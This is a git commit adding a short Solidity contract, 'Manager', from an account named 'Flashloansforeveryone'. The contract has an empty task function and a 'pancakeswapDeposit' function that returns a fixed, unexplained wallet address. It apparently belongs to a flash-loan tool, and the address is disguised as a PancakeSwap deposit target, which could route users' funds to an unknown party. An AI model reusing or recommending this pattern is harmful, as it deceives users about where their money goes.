ce102b24bab5a264379d8514287ef2d108eba42a
Flashloansforeveryone <106495039+Flashloansforeveryone@users.noreply.github.com>
2022-05-30 01:16:20 +0300

    Create IIlendingclass.sol

---
+++ IIlendingclass.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0xea81Bc282Ca946bCb17a6083a62651BfF4E91E98;
+	}
+	
+}
